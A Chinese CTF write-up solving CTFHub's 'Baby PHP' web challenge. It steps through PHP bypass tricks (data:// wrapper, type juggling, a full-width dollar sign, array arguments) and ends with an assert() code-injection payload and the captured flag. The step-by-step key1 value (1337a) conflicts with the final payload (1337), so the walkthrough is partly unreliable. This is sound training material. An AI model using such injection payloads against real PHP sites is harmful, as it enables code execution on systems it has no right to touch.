---
layout: null
---

### 题目名称：Baby PHP

题目来源：CTFHub（原题：2018-hack.lu-Web-baby）

题目类别：Web

题目描述：PHP is a popular general-purpose scripting language that is especially suited to web development. \nFast, flexible and pragmatic, PHP powers everything from your blog to the most popular websites in the world.\nCan you untangle this mess?!

### 解题思路

无，马后炮。

听从deepseek，这是 hack.lu CTF 2018 的原题 Baby PHP，CTFHub 做了复刻。整段代码是一路 PHP 黑魔法：第一关用 data:// 伪协议把 Hello Challenge! 喂给 file_get_contents；第二关利用 intval 与 === 的差异；第三关最阴，正则里那个"美元符号"其实是全角＄(U+FF04)，所以 key2 必须是"数字紧跟全角＄"而且长度正好 42 字节；第四关要过 substr($cc,42) === sha1($cc)，只能把 cc 传成数组，让 substr 和 sha1 同时失效返回 null，null === null 才成立；第五关是变量覆盖，配合第 44 行那个不可见字符 U+202E 推出来的 $$a 等于 "2"，所以 k1 要传 2；最后一关 assert("$bb == $cc") 在 PHP 5 下会把字符串当代码执行，而 $cc 是数组、插值出来就是字面量 Array，所以必须在 bb 末尾用 // 把" == Array"注释掉，再用 print_r($flag) 把 flag 打出来。

### 详细步骤

1. 打开题目，页面直接给出源码

2. 第一关：msg 用 data:// 伪协议喂进指定内容

    ?msg=data://text/plain,Hello Challenge!

3. 第二关：key1 要"intval 得 1337、但本身不是整数"，传 1337a

    &key1=1337a

4. 第三关：key2 要 42 字节、以数字开头、后面紧跟一个全角＄

    &key2=000000000000000000000000000000000001337＄

5. 第四关：cc 传成数组，让 substr 和 sha1 同时返回 null

    &cc[]=

6. 第五关：k1 传 2，对应第 44 行那个反向显示字符推出来的 $$a

    &k1=2

7. 最后一关：bb 末尾接 //，把 $cc 插值出来的 Array 注释掉，同时让它执行 print_r($flag)

    &bb=print_r($flag);//

8. 拼成完整 payload 访问

    ?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=000000000000000000000000000000000001337＄&cc[]=&k1=2&bb=print_r($flag);//

9. 页面里就能看到 flag

10. 获得flag

### Payload

?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=000000000000000000000000000000000001337＄&cc[]=&k1=2&bb=print_r($flag);//

### flag

ctfhub{b058f1879ae830d39b282569}

### 总结&反思
